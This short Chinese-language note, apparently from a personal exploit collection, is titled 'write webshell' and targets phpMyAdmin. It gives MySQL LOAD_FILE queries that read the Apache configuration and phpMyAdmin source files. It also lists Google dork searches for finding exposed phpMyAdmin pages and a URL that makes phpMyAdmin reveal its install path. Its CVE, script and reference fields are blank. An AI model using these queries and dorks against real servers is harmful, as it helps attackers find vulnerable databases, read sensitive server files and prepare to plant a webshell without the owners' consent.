##cve编号：无
##漏洞名称：写webshell
##漏洞类型：
##影响版本：全
##利用脚本：无
##漏洞细节：
- SELECT LOAD_FILE( '/etc/httpd/conf/httpd.conf' )
- SELECT LOAD_FILE( '/var/www/html/phpmyadmin/index.php' )
### google hacking
- inurl:sql.php 知名架构数据库名字如 dede phpcms 
- inurl:tbl_structure.php 任何你想到的。
- inurl:tbl_structure.php love 
- 暴路径 weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
##reference：
